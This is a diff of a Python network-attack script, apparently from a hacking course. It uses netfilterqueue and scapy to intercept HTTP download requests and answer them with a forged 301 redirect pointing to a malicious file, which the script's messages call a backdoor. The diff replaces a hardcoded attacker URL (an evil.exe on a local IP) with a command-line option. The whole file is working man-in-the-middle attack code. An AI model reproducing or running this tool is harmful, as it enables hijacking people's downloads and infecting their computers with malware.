@@ -1,7 +1,15 @@
 #!/usr/bin/env python
 import netfilterqueue as netq
 import scapy.all as scapy
+import optparse
 
+def get_args():
+    parser = optparse.OptionParser()
+    parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
+    (val, args) = parser.parse_args()
+    if not val.mal_link:
+        parser.error("ERROR Missing argument, use --help for more info")
+    return val
 
 def mod_packet(packet, link):
     packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: " + link + "\n\n"
@@ -23,11 +31,11 @@ def mod_packet(packet):
                 print("[+] HTTP Response for the Download Req...#########")
                 req_ack.remove(use_packet[scapy.TCP].seq)
                 print("[+] Replacing Download with backdoor...")
-                modified_packet = mod_packet(use_packet, mal_link)
+                modified_packet = mod_packet(use_packet, value.mal_link)
                 packet.set_payload(str(modified_packet))
     packet.accept()
 
-mal_link = "http://10.0.2.18/evil.exe"
+value = get_args()
 queue = netq.NetfilterQueue()
 queue.bind(0, mod_packet)
 queue.run()
